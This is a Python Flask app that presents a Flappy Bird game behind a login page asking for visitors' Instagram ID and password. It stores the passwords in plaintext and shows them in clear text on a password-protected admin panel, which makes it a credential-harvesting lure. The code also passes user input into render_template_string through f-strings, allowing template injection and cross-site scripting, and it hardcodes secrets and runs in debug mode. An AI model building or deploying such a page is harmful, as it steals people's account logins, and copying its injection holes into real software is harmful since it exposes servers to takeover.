# app.py
from flask import Flask, request, render_template_string, redirect, url_for, session
import json
import os

app = Flask(__name__)
app.secret_key = "supersecretkey123"

USERS_FILE = "users.json"

# ===== Helper Functions =====
if not os.path.exists(USERS_FILE):
    with open(USERS_FILE, "w") as f:
        json.dump({}, f)

def load_users():
    with open(USERS_FILE) as f:
        return json.load(f)

def save_users(users):
    with open(USERS_FILE, "w") as f:
        json.dump(users, f, indent=2)

# ===== LOGIN / SIGNUP =====
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        insta_id = request.form.get('insta_id')
        password = request.form.get('password')
        users = load_users()

        # Auto-register pending approval
        if insta_id not in users:
            users[insta_id] = {"password": password, "approved": None}
            save_users(users)

        user = users[insta_id]

        if user['approved'] is True:
            session['user'] = insta_id
            return redirect(url_for('game'))
        elif user['approved'] is False:
            return render_template_string("""
            <script>alert("❌ Your login was denied by admin.");</script>
            <meta http-equiv="refresh" content="0; url=/" />
            """)
        else:
            return render_template_string("""
            <script>alert("⏳ Waiting for admin approval.");</script>
            <meta http-equiv="refresh" content="0; url=/" />
            """)

    return render_template_string("""
    <html>
    <head>
        <meta name='viewport' content='width=device-width, initial-scale=1.0'>
        <style>
            body {
                text-align:center;
                font-family:sans-serif;
                background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
                color: #333;
            }
            h1 {
                margin-top:40px;
                color: #fff;
                text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
            }
            form {
                background: rgba(255,255,255,0.8);
                display:inline-block;
                padding: 30px;
                border-radius: 20px;
                margin-top:20px;
                box-shadow: 0 8px 20px rgba(0,0,0,0.3);
            }
            input {
                padding:10px;
                margin:10px 0;
                width: 200px;
                border-radius:10px;
                border:1px solid #ccc;
            }
            button {
                padding:10px 20px;
                border:none;
                border-radius:10px;
                background: #ff6f61;
                color:#fff;
                font-weight:bold;
                cursor:pointer;
                transition:0.3s;
            }
            button:hover {
                background: #ff3b2e;
            }
            a {
                display:block;
                margin-top:20px;
                color:#fff;
                text-decoration:none;
            }
        </style>
    </head>
    <body>
        <h1>Login / Request Access</h1>
        <form method='POST'>
            <input name='insta_id' placeholder='Instagram ID' required><br>
            <input type='password' name='password' placeholder='Password' required><br>
            <button type='submit'>Submit</button>
        </form>
        <a href="/admin">Admin Panel</a>
    </body>
    </html>
    """)

# ===== FLAPPY BIRD GAME =====
@app.route('/game')
def game():
    if 'user' not in session:
        return redirect(url_for('login'))

    if 'attempts' not in session:
        session['attempts'] = 0

    return render_template_string(f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Flappy Bird - {session['user']}</title>
        <meta name='viewport' content='width=device-width, initial-scale=1.0'>
        <style>
            body {{
                font-family: 'Arial', sans-serif;
                background: linear-gradient(to bottom, #70c5ce, #fff);
                display:flex;
                flex-direction: column;
                align-items:center;
                margin:0; padding:0;
            }}
            h1 {{ margin-top:20px; text-shadow:2px 2px 5px rgba(0,0,0,0.2); }}
            #gameContainer {{
                background:#70c5ce;
                border-radius:20px;
                box-shadow:0 8px 20px rgba(0,0,0,0.3);
                width:400px;
                padding:10px;
                margin:20px 0;
            }}
            canvas {{ display:block; background:#70c5ce; border-radius:10px; margin:0 auto; }}
            p {{ font-size:16px; }}
            a {{
                text-decoration:none;
                color:#fff;
                background:#ff6f61;
                padding:8px 16px;
                border-radius:10px;
                margin-top:10px;
                display:inline-block;
                transition:0.3s;
            }}
            a:hover {{ background:#ff3b2e; }}
        </style>
    </head>
    <body>
        <h1>Flappy Bird 🎮</h1>
        <p>Player: {session['user']}</p>
        <div id="gameContainer">
            <canvas id="gameCanvas" width="400" height="600"></canvas>
            <p>Score: <span id="score">0</span></p>
            <p>Attempts: <span id="attempts">{session['attempts']}</span></p>
            <p id="message"></p>
        </div>
        <a href="/logout">Logout</a>

        <script>
        const canvas = document.getElementById('gameCanvas');
        const ctx = canvas.getContext('2d');
        const scoreEl = document.getElementById('score');
        const attemptsEl = document.getElementById('attempts');
        const messageEl = document.getElementById('message');

        let bird = {{ x:50, y:300, width:30, height:30, velocity:0, gravity:0.6, lift:-10 }};
        let pipes = [];
        let frame = 0;
        let score = 0;
        let gameOver = false;
        let gap = 200; // Increased gap

        document.addEventListener('keydown', e => {{ if(e.code==='Space') flap(); }});
        document.addEventListener('click', flap);

        function flap() {{
            if(gameOver) resetGame();
            bird.velocity = bird.lift;
        }}

        function createPipe() {{
            let topHeight = Math.floor(Math.random()*300)+50;
            pipes.push({{x:400, y:0, width:50, height:topHeight}});
            pipes.push({{x:400, y:topHeight+gap, width:50, height:600}});
        }}

        function resetGame() {{
            bird.y = 300;
            bird.velocity = 0;
            pipes = [];
            frame = 0;
            score = 0;
            gameOver = false;
            scoreEl.textContent = score;
            messageEl.textContent = "";

            fetch('/increment_attempts');  // increment attempts on game over
            requestAnimationFrame(draw);
        }}

        function draw() {{
            ctx.clearRect(0,0,canvas.width,canvas.height);

            ctx.fillStyle = 'yellow';
            ctx.fillRect(bird.x, bird.y, bird.width, bird.height);

            ctx.fillStyle = 'green';
            pipes.forEach(pipe => {{ ctx.fillRect(pipe.x, pipe.y, pipe.width, pipe.height); }});

            bird.velocity += bird.gravity;
            bird.y += bird.velocity;

            pipes.forEach(pipe => {{ pipe.x -= 2; }});
            pipes = pipes.filter(pipe => pipe.x + pipe.width > 0);

            if(frame % 120 === 0) createPipe();

            for(let pipe of pipes){{
                if(bird.x < pipe.x + pipe.width && bird.x + bird.width > pipe.x &&
                   bird.y < pipe.y + pipe.height && bird.y + bird.height > pipe.y){{
                    gameOver = true;
                    messageEl.textContent = "💥 Game Over! Click or press SPACE to restart.";
                }}
            }}

            if(bird.y + bird.height > canvas.height || bird.y < 0){{
                gameOver = true;
                messageEl.textContent = "💥 Game Over! Click or press SPACE to restart.";
            }}

            pipes.forEach(pipe => {{
                if(!pipe.passed && pipe.y===0 && pipe.x + pipe.width < bird.x){{
                    pipe.passed = true;
                    score++;
                    scoreEl.textContent = score;
                }}
            }});

            frame++;
            if(!gameOver) requestAnimationFrame(draw);
        }}

        requestAnimationFrame(draw);
        </script>
    </body>
    </html>
    """)

# ===== INCREMENT ATTEMPTS =====
@app.route('/increment_attempts')
def increment_attempts():
    if 'attempts' in session:
        session['attempts'] += 1
    else:
        session['attempts'] = 1
    return '', 204

# ===== ADMIN PANEL =====
@app.route('/admin', methods=['GET', 'POST'])
def admin():
    master_pass = "slicingyourlife"

    if request.method == 'POST' and 'master' in request.form:
        if request.form.get('master') != master_pass:
            return render_template_string("""
            <script>alert("❌ Wrong admin password!");</script>
            <meta http-equiv="refresh" content="0; url=/admin" />
            """)
        session['admin'] = True
        return redirect(url_for('admin'))

    if not session.get('admin'):
        return render_template_string("""
        <html>
        <body style='text-align:center; font-family:sans-serif;'>
            <h1>Admin Login</h1>
            <form method='POST'>
                <input type='password' name='master' placeholder='Admin Password' required>
                <button type='submit'>Enter</button>
            </form>
        </body>
        </html>
        """)

    users = load_users()
    msg = ""
    action = request.args.get('action')
    user_id = request.args.get('user')
    if action and user_id:
        if user_id in users:
            if action == 'approve':
                users[user_id]['approved'] = True
                msg = f"{user_id} approved ✅"
            elif action == 'deny':
                users[user_id]['approved'] = False
                msg = f"{user_id} denied ❌"
            save_users(users)

    pending_html = ""
    for u, d in users.items():
        if d['approved'] is None:
            pending_html += f"""
            <li>{u} - Password: {d['password']} - 
            <a href='/admin?action=approve&user={u}'>Approve ✅</a> | 
            <a href='/admin?action=deny&user={u}'>Deny ❌</a>
            </li>
            """

    return render_template_string(f"""
    <html>
    <body style='text-align:center; font-family:sans-serif;'>
        <h1>Admin Panel</h1>
        <h2>Pending Requests</h2>
        <ul>
            {pending_html if pending_html else "<li>No pending requests</li>"}
        </ul>
        <p style='color:green;'>{msg}</p>
        <p><a href="/">Back to Login</a></p>
    </body>
    </html>
    """)

# ===== LOGOUT =====
@app.route('/logout')
def logout():
    session.pop('user', None)
    session.pop('admin', None)
    return redirect(url_for('login'))

# ===== RUN APP =====
if __name__ == '__main__':
    app.run(debug=True)
